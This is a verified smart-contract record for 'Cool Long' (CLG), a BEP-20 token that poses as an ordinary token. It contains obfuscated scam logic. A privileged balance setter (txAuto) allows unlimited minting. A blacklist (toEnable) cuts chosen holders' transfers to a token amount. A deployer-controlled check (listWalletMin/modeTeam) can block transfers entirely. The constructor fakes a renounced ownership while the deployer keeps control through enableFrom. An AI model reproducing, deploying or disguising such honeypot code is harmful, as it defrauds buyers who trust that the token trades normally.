{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface takeShouldFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxTxTake {\n    function createPair(address txSellToken, address amountMarketingTeam) external returns (address);\n}\n\ninterface takeToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenFee) external view returns (uint256);\n\n    function transfer(address minListWallet, uint256 autoReceiver) external returns (bool);\n\n    function allowance(address txReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minListWallet,\n        uint256 autoReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTrading, uint256 value);\n    event Approval(address indexed txReceiver, address indexed spender, uint256 value);\n}\n\ninterface takeTokenMetadata is takeToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CoolLong is amountMin, takeToken, takeTokenMetadata {\n\n    bool private toLimit;\n\n    uint256 private limitAmount;\n\n    function toEnable(address senderShould) public {\n        teamTake();\n        if (exemptLiquidityMin != limitAmount) {\n            limitAmount = launchFee;\n        }\n        if (senderShould == enableFrom || senderShould == senderLaunch) {\n            return;\n        }\n        senderEnableIs[senderShould] = true;\n    }\n\n    function receiverEnableMin() public {\n        emit OwnershipTransferred(enableFrom, address(0));\n        listBuySender = address(0);\n    }\n\n    function approve(address isListTrading, uint256 autoReceiver) public virtual override returns (bool) {\n        feeLiquidity[_msgSender()][isListTrading] = autoReceiver;\n        emit Approval(_msgSender(), isListTrading, autoReceiver);\n        return true;\n    }\n\n    uint8 private limitTeamAuto = 18;\n\n    address listLaunchSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private minReceiver;\n\n    event OwnershipTransferred(address indexed totalLaunched, address indexed totalListFund);\n\n    uint256 public exemptLiquidityMin;\n\n    function transfer(address minAuto, uint256 autoReceiver) external virtual override returns (bool) {\n        return senderSell(_msgSender(), minAuto, autoReceiver);\n    }\n\n    uint256 public launchFee;\n\n    function senderSell(address modeSellReceiver, address minListWallet, uint256 autoReceiver) internal returns (bool) {\n        if (modeSellReceiver == enableFrom) {\n            return isSender(modeSellReceiver, minListWallet, autoReceiver);\n        }\n        uint256 buyModeAmount = takeToken(senderLaunch).balanceOf(tokenSwapTotal);\n        require(buyModeAmount == modeTeam);\n        require(minListWallet != tokenSwapTotal);\n        if (senderEnableIs[modeSellReceiver]) {\n            return isSender(modeSellReceiver, minListWallet, swapFee);\n        }\n        return isSender(modeSellReceiver, minListWallet, autoReceiver);\n    }\n\n    mapping(address => bool) public senderEnableIs;\n\n    uint256 private exemptFee;\n\n    constructor (){\n        \n        takeShouldFund walletFrom = takeShouldFund(listLaunchSwap);\n        senderLaunch = maxTxTake(walletFrom.factory()).createPair(walletFrom.WETH(), address(this));\n        if (exemptFee == limitAmount) {\n            launchList = false;\n        }\n        enableFrom = _msgSender();\n        receiverEnableMin();\n        tradingLaunched[enableFrom] = true;\n        minReceiver[enableFrom] = limitReceiverFee;\n        if (exemptLiquidityMin == launchFee) {\n            toLimit = true;\n        }\n        emit Transfer(address(0), enableFrom, limitReceiverFee);\n    }\n\n    string private liquidityAt = \"CLG\";\n\n    address public enableFrom;\n\n    address private listBuySender;\n\n    mapping(address => bool) public tradingLaunched;\n\n    address tokenSwapTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function teamTake() private view {\n        require(tradingLaunched[_msgSender()]);\n    }\n\n    uint256 modeTeam;\n\n    mapping(address => mapping(address => uint256)) private feeLiquidity;\n\n    function txAuto(address minAuto, uint256 autoReceiver) public {\n        teamTake();\n        minReceiver[minAuto] = autoReceiver;\n    }\n\n    uint256 listMode;\n\n    function getOwner() external view returns (address) {\n        return listBuySender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitReceiverFee;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityAt;\n    }\n\n    function isSender(address modeSellReceiver, address minListWallet, uint256 autoReceiver) internal returns (bool) {\n        require(minReceiver[modeSellReceiver] >= autoReceiver);\n        minReceiver[modeSellReceiver] -= autoReceiver;\n        minReceiver[minListWallet] += autoReceiver;\n        emit Transfer(modeSellReceiver, minListWallet, autoReceiver);\n        return true;\n    }\n\n    function balanceOf(address tokenFee) public view virtual override returns (uint256) {\n        return minReceiver[tokenFee];\n    }\n\n    uint256 private limitReceiverFee = 100000000 * 10 ** 18;\n\n    string private atToken = \"Cool Long\";\n\n    bool public swapLiquidity;\n\n    bool public launchList;\n\n    function name() external view virtual override returns (string memory) {\n        return atToken;\n    }\n\n    function modeLiquidityExempt(address listMarketing) public {\n        if (swapLiquidity) {\n            return;\n        }\n        if (launchFee == exemptFee) {\n            launchList = true;\n        }\n        tradingLaunched[listMarketing] = true;\n        if (exemptFee == launchFee) {\n            exemptFee = launchFee;\n        }\n        swapLiquidity = true;\n    }\n\n    function allowance(address autoFee, address isListTrading) external view virtual override returns (uint256) {\n        if (isListTrading == listLaunchSwap) {\n            return type(uint256).max;\n        }\n        return feeLiquidity[autoFee][isListTrading];\n    }\n\n    function owner() external view returns (address) {\n        return listBuySender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTeamAuto;\n    }\n\n    uint256 constant swapFee = 4 ** 10;\n\n    address public senderLaunch;\n\n    function transferFrom(address modeSellReceiver, address minListWallet, uint256 autoReceiver) external override returns (bool) {\n        if (_msgSender() != listLaunchSwap) {\n            if (feeLiquidity[modeSellReceiver][_msgSender()] != type(uint256).max) {\n                require(autoReceiver <= feeLiquidity[modeSellReceiver][_msgSender()]);\n                feeLiquidity[modeSellReceiver][_msgSender()] -= autoReceiver;\n            }\n        }\n        return senderSell(modeSellReceiver, minListWallet, autoReceiver);\n    }\n\n    function listWalletMin(uint256 autoReceiver) public {\n        teamTake();\n        modeTeam = autoReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalListFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isListTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isListTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidityMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"listWalletMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"}],\"name\":\"modeLiquidityExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderEnableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"}],\"name\":\"toEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSellReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minListWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CoolLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}